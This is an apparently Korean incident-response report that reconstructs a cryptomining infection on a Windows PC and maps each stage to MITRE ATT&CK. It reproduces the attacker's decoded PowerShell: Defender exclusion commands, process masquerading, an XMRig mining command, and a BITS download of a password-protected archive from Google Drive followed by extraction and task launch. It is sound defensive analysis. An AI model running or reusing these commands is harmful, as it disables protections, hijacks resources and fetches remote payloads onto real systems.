# 다단계 공격 체인 — 상세 분석

> **대상**: 김차장 PC · Windows 11 · `<VICTIM_IP>` / `<VICTIM_USER>`  
> **분석 방식**: Cortex XDR Forensics 사후 재구성 (11,170건)  
> **목표**: 초기 유입 → 마스커레이딩 → 방어 회피 → 마이닝 → 자기복구 → 추가 페이로드

---

## 공격 흐름 요약

```
[초기 유입]   Hwp.exe / 네트워크 공유 PPTX (벡터 미확정)
    │
    ▼
[단계 1] 마스커레이딩 — powershell.exe → svchost.exe / KB5019959.exe   [T1036.005]
    │
    ▼
[단계 2] 방어 회피 — Windows Defender 예외 등록                        [T1562.001]
    │
    ▼
[단계 3] 실행 — XMRig rx/0 Monero 마이닝                               [T1496]
    │
    ▼
[단계 4] 자기복구 루프 — CriticalUpdate(LUR) 30분 간격                 [T1053.005]
    │
    ▼
[단계 5] 추가 페이로드 — Google Drive BITS 다운로더                    [T1105, T1197]
    │
    ▼
[단계 ?] UVxOHL_10240 최종 태스크 (내용 미확인)
```

---

## 단계 0 — 초기 유입 (벡터 미확정)
**MITRE**: T1204.002

XDR 오프라인 기간(~13:03–14:04 KST) 중 발생. `xdr_data` 프로세스 생성 이벤트 부재로 **프로세스 레벨 증거 없음**. BAM(Background Activity Moderator) 및 Recent Files 아티팩트만 존재.

**유력 후보 2개:**

| 후보 | 근거 | 판단 |
|------|------|------|
| `Hwp.exe` (한글 2024) | BAM 기록 13:03 KST, XMRig 최초 연결 30분 전 | OLE 익스플로잇 가능성 |
| `\\<FILESERVER_IP>\gt00\` PPTX | 전일 네트워크 공유 열람 확인 | 매크로 가능성 |

> 두 경로 모두 배제 불가. 최종 판정에는 원본 문서의 OLE 객체/매크로 분석 필요 (대응 권고 6번 참조).

---

## 단계 1 — 마스커레이딩 (Masquerading)
**MITRE**: T1036.005 — Match Legitimate Name or Location

정상 PowerShell 바이너리를 시스템 프로세스명으로 복사하여 위장:

```
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  →  C:\Windows\svchost.exe
copy SysWow64\powershell.exe                                    →  C:\ProgramData\KB5019959.exe
```

| 항목 | 값 |
|------|-----|
| SHA1 | `0b2e795525166044e6c2b8527b5f01571b4e6718` |
| 크기 | 423,424 B (32비트 SysWOW64 powershell) |
| 위장 경로 | `C:\Windows\svchost.exe` (정상은 `System32\svchost.exe`) |

**정상 svchost.exe와의 판별 기준 3가지:**

1. 실행 경로가 `C:\Windows\` 루트 (정상은 `C:\Windows\System32\`)
2. `-k [서비스그룹]` 인수 없음 (정상 svchost는 항상 `-k` 존재)
3. XMRig `cmd.exe`가 직접 자식 프로세스로 생성됨

**Prefetch 증거:**

```
SVCHOST.EXE-2A35E6EF.pf   ← 정상 System32 svchost와 다른 해시값
```
> Windows Prefetch는 실행 파일 전체 경로별로 고유 해시(.pf)를 생성한다. 정상 `svchost.exe`의 Prefetch 해시와 다른 `2A35E6EF` 해시 = **별도 경로의 실행 파일**임을 확정.

---

## 단계 2 — 방어 회피: Windows Defender 예외 등록
**MITRE**: T1562.001 — Impair Defenses: Disable or Modify Tools

위장한 `svchost.exe`가 Base64 인코딩된 명령으로 Defender 스캔 예외를 등록:

```
C:\Windows\svchost.exe -e [Base64 Layer2]
```

**디코딩 결과 (UTF-16LE):**

```powershell
Add-MpPreference -ExclusionPath @('C:\ProgramData\Google') `
  -ExclusionProcess @(
    'software_reporter_tool.exe',
    'svchost.exe',
    'KB5019959.exe',
    'cmd.exe',
    'GoogleUpdate.exe',
    'powershell.exe'
  )
```

`C:\ProgramData\Google` 전체 경로와 핵심 프로세스명을 Defender 스캔 예외로 등록. 이후 해당 경로의 모든 악성 파일은 실시간 보호에서 탐지 불가.

---

## 단계 3 — 실행: XMRig Monero 마이닝
**MITRE**: T1496 — Resource Hijacking

```
cmd.exe -a rx/0 --url ssl-maimai.com:27039 --user 43b1fdda-f121-4f80-8832-ff29b7007739
```

| 항목 | 값 |
|------|-----|
| 마이닝 풀 | `ssl-maimai.com:27039` (IP `65.21.239.189`) |
| 알고리즘 | `rx/0` (RandomX — CPU 집약적 Monero) |
| 워커 ID | `43b1fdda-f121-4f80-8832-ff29b7007739` |

`SysWOW64 cmd.exe`가 `tasklist | find`를 실행 — 기존 마이너 프로세스 생존 여부를 확인하는 전형적 패턴.

---

## 단계 4 — 자기복구 루프: CriticalUpdate(LUR)
**MITRE**: T1053.005 — Scheduled Task/Job

30분 간격으로 반복되는 스케줄드 태스크가 전체 체인을 재설치:

```
cmd.exe /c copy SysWow64\powershell.exe C:\ProgramData\KB5019959.exe
→ KB5019959.exe -e [Base64 Layer1]
```

**Layer 1 디코딩 결과:**

```powershell
powershell cmd.exe /c copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\svchost.exe;
C:\Windows\svchost.exe -e [Layer2_Base64]
```

XDR가 svchost.exe를 차단·삭제해도, 다음 트리거(30분 후)에서 `KB5019959.exe`가 다시 svchost.exe를 생성하고 Defender 예외를 재등록한다. **차단에 대한 자기복구(self-healing) 메커니즘**. `KB5019959.exe`라는 이름은 Windows KB 패치 파일로 위장.

---

## 단계 5 — 추가 페이로드 다운로더: GoogleUpdateTaskSYSTEM
**MITRE**: T1105 (Ingress Tool Transfer), T1197 (BITS Jobs)

```
C:\Windows\svchost.exe -e [Base64 Layer3]
```

**Layer 3 디코딩 결과:**

```powershell
Start-Sleep 80

Start-BitsTransfer `
  'https://www.googleapis.com/drive/v3/files/1FIdeFWuXuwHgvxy1c3q6Xv2BFYaKMS0O?alt=media&key=AIzaSyD94KbMUwXmWDriqj2UQGL_TRXNg51y1q8&supportAllDrives=True' `
  'C:\ProgramData\Google\.png.001'

cmd.exe /c "C:\ProgramData\Google\7z.exe" x -oC:\ProgramData\Google\ C:\ProgramData\Google\.png.001 -px -y

Start-ScheduledTask -TaskPath "\Microsoft\Windows\UVxOHL_10240..."
```

| 기법 | 의도 |
|------|------|
| `Start-Sleep 80` | 보안 솔루션 동적 분석 샌드박스 우회 (80초 대기) |
| `Start-BitsTransfer` | BITS 서비스 악용 — 일부 네트워크 탐지 우회, 정상 Windows 컴포넌트 활용 |
| Google Drive | 정상 클라우드 서비스를 C2/배포 채널로 활용 (도메인 평판 우회) |
| `.png.001` | PNG 확장자 위장 7z 아카이브 (비밀번호 보호) |
| `7z.exe` | LOLBAS — 정상 7-Zip 바이너리로 압축 해제 (T1218) |
| `-px` | 7z 비밀번호 인수 (값 잘림 — 추출 미완료) |

---

## 핵심: 3중 Base64 인코딩 구조
**MITRE**: T1027 (Obfuscation), T1140 (Deobfuscate), T1059.001 (PowerShell)

```
KB5019959.exe -e [Layer1_Base64]
    │ 디코딩 (UTF-16LE)
    ▼
  powershell → svchost.exe 복사 + svchost.exe -e [Layer2_Base64]
                                      │ 디코딩 (UTF-16LE)
                                      ▼
                                Add-MpPreference (Defender 예외)
                                + svchost.exe -e [Layer3_Base64]
                                                    │ 디코딩 (UTF-16LE)
                                                    ▼
                                              BitsTransfer + 7z + Task 기동
```

각 레이어는 PowerShell `-EncodedCommand` 표준 인코딩(UTF-16LE → Base64)을 사용. 디코딩 검증 방법:

```python
import base64
decoded = base64.b64decode(layer_b64).decode('utf-16-le')
print(decoded)
```

---

## 전체 MITRE ATT&CK 매핑

| ID | 기법 | 사용 방식 |
|----|------|----------|
| T1204.002 | User Execution: Malicious File | HWP/PPTX 통한 초기 실행 (추정) |
| T1036.005 | Masquerading: Match Legitimate Name | svchost.exe / KB5019959.exe 위장 |
| T1027 | Obfuscated Files or Information | 3중 Base64 인코딩 |
| T1140 | Deobfuscate/Decode Files | PowerShell -EncodedCommand 실행 |
| T1059.001 | Command and Scripting: PowerShell | 전 단계 실행 도구 |
| T1562.001 | Impair Defenses | Defender ExclusionPath/Process 등록 |
| T1053.005 | Scheduled Task/Job | CriticalUpdate(LUR), GoogleUpdateTaskSYSTEM |
| T1105 | Ingress Tool Transfer | Google Drive → .png.001 다운로드 |
| T1197 | BITS Jobs | Start-BitsTransfer 악용 |
| T1496 | Resource Hijacking | XMRig Monero 마이닝 |
| T1547 | Boot or Logon Autostart Execution | ms-gamingoverlay LNK (목적 미확인) |
| T1083 | File and Directory Discovery | SYSTEM 경로 접근 |
| T1218 | System Binary Proxy Execution | 7z.exe LOLBAS |

---

## 미해결 사항

| # | 항목 | 한계 |
|---|------|------|
| 1 | 최초 유입 벡터 | XDR 오프라인 → 프로세스 이벤트 없음. Hwp.exe/PPTX 후보 미확정 |
| 2 | `.png.001` 최종 페이로드 | 7z 비밀번호 잘림 → 압축 해제 내용 불명 |
| 3 | `UVxOHL_10240` 태스크 | 실행 바이너리 정체 불명 (마이닝 단독 vs 추가 목적) |
| 4 | ms-gamingoverlay LNK | target 없는 2건 (14:51 KST) 목적 불명 |
| 5 | 공유 서버 감염 | `\\<FILESERVER_IP>\gt00\` 전파 여부 미확인 |

> 탐지 쿼리·대응 권고: [forensics_detection.md](forensics_detection.md)
